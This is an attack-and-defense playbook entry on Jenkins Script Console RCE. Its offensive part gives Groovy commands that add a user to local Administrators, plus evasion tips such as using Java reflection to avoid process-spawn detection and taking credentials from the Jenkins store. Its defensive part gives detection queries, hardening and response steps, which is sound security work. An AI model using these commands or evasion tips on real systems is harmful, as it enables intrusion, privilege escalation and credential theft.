name: Jenkins Groovy Script Console RCE
description: Abuse Jenkins Script Console (Groovy) to execute OS commands. Jenkins often runs as SYSTEM or a service account with domain privileges.

steps.label: Add user to local admins
steps.command:
def proc = ['cmd','/c','net localgroup administrators <user> /add'].execute()
println proc.text

examples.label: Add user to Administrators
examples.command:
def proc = ['cmd','/c','net localgroup administrators jdoe /add'].execute()
println proc.text

examples.label: PowerShell reverse shell

recommended.note: Run PowerUp for additional local privesc vectors
Use service account credentials for lateral movement

notes: Jenkins often runs as SYSTEM or a privileged service account. Script console allows unrestricted OS command execution.

defense.why_it_works: Jenkins' Script Console (at /script) provides an unauthenticated or poorly-authenticated Groovy REPL that executes code in the JVM as the Jenkins service account. Groovy's Runtime.exec() allows direct OS command execution. If Jenkins runs as SYSTEM or a domain service account, this becomes immediate code execution with those privileges. Many Jenkins deployments are accessible to all authenticated users or even anonymously.
defense.prerequisites: Network access to Jenkins web interface. Access to /script endpoint (admin rights, or anonymous/all-users access enabled). Groovy code execution capability not disabled.
defense.impact: T1059.007 Command and Scripting Interpreter: JavaScript (Groovy JVM) + T1505.003 Server Software Component: Web Shell. OS-level command execution as Jenkins service account. If Jenkins runs as SYSTEM or domain service account, immediate PrivEsc or lateral movement. Build credentials stored in Jenkins credential store are also accessible.
defense.detection:
Event 4688: unexpected child process of java.exe (cmd.exe, powershell.exe). Sysmon Event 1: java.exe spawning cmd.exe. Jenkins audit log: Groovy script console access events. Web server access log: POST to /script endpoint from unexpected user. Network: outbound reverse shell connection from Jenkins server.
Scripting interpreters (powershell.exe, cmd.exe, wscript.exe) executing outside expected time windows or from abnormal user contexts (DET0516).
Shell interpreters (bash, sh, python, perl) initiated by unexpected users or processes chaining netcat/curl/ssh.
macOS scripting launched via Terminal/Automator/hidden osascript with unusual parent process.
ESXi busybox shell spawned from SSH unexpectedly; network device CLI from uncommon accounts or unknown IPs.
defense.artifacts: Event 4688: cmd.exe/powershell.exe as child of java.exe | Sysmon Event 1: jenkins process spawning OS commands | Jenkins audit.log: script console use | Web access log: POST /script | Network: outbound connection to attacker from Jenkins host
defense.splunk_spl:
index=sysmon EventCode=1 ParentImage="*java.exe" (Image="*cmd.exe" OR Image="*powershell.exe")
| table _time, Computer, ParentImage, Image, CommandLine

index=web sourcetype=access_combined uri_path="/script" method=POST
| table _time, clientip, uri_path, status
defense.elastic_kql: event.code:"1" AND process.parent.name:java.exe AND process.name:(cmd.exe OR powershell.exe)
defense.sentinel_kql:
DeviceProcessEvents
| where InitiatingProcessFileName =~ "java.exe"
| where FileName in~ ("cmd.exe","powershell.exe")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by Timestamp desc
defense.prevention:
Disable the Script Console for non-admin users (Manage Jenkins → Security → disable script console for users). Enable Jenkins security (not anonymous access). Run Jenkins as a dedicated low-privilege service account (not SYSTEM). Segment Jenkins from the domain - it shouldn't have domain credentials or access production systems. Review credentials stored in Jenkins Credential Store. Deploy WAF to block /script endpoint from unauthorized sources.
Antivirus/Antimalware: Auto-quarantine of malicious scripting interpreter activity.
Audit: Inventory interpreter usage to detect unexpected scripting binaries.
Behavior Prevention on Endpoint: Windows 10 ASR rules blocking VBScript and JScript execution.
Code Signing: Permit only signed scripts; block unsigned interpreter executions.
Disable or Remove Feature or Program: Remove unused shells and scripting interpreters.
Execution Prevention: Application control (WDAC/AppLocker); PowerShell Constrained Language Mode (restrict Add-Type).
Privileged Account Management: Restrict PowerShell execution policy to admins; use PowerShell Just Enough Administration (JEA).
Restrict Web-Based Content: Script-blocking browser extensions and ad blockers.
defense.evasion: Use Build pipelines instead of direct script console (groovy runs in build steps, harder to audit). Exfiltrate credentials from Jenkins secrets store instead of spawning processes. Use Java reflection to execute code without directly calling Runtime.exec (bypass process spawn detection).
defense.misconfiguration: Jenkins Script Console accessible to non-admin users or anonymously. Jenkins runs as SYSTEM or domain admin. Jenkins has domain credentials in its store. No audit logging of script console usage. Jenkins accessible from workstations without WAF.
defense.vulnerable_config:
# Jenkins running as SYSTEM (check service account):
Get-WmiObject Win32_Service -Filter {Name='Jenkins'} | Select-Object Name,StartName
# StartName: LocalSystem = SYSTEM = CRITICAL

# Script Console accessible to all authenticated users:
# Manage Jenkins → Global Security → Authorization:
# → 'Logged-in users can do anything' = Script Console open to all

# Anonymous read access enabled (even worse):
# Allow anonymous read access: True → Script Console publicly accessible
defense.secure_config:
# Run Jenkins as dedicated low-privilege account:
# Services → Jenkins → Log On → This account → svc_jenkins
# svc_jenkins: no local admin, no domain rights, no RDP

# Restrict Script Console to Jenkins administrators only:
# Manage Jenkins → Security → Enable Jenkins' own user database
# → Project-based Matrix Authorization Strategy
# → Only admin group has Administer permission

# Block /script from non-admin hosts via reverse proxy (nginx):
# location /script {
#   allow 10.0.100.0/24;  # Admin VLAN only
#   deny all;
# }

# Disable Script Console entirely if not needed:
# Jenkins → Plugin Manager: install 'Script Security' plugin to sandbox Groovy

# Sysmon rule:
# Event 1: ParentImage contains 'java.exe' AND Image contains 'cmd.exe' → ALERT

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review PowerShell Script Block / Module Logs, Sysmon, Windows Security Event Log, Web proxy logs for surrounding context (5 min before/after)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

explain:
Executes OS commands through the Jenkins Script Console (Groovy), which often runs as SYSTEM or a domain service account:
  println                   print the result to the console output
  'whoami'.execute().text   run the OS command and capture its stdout
Browse to http://<ip>:8080/script, run this to confirm RCE, then escalate (e.g. ['cmd','/c','net localgroup administrators <user> /add'].execute()).
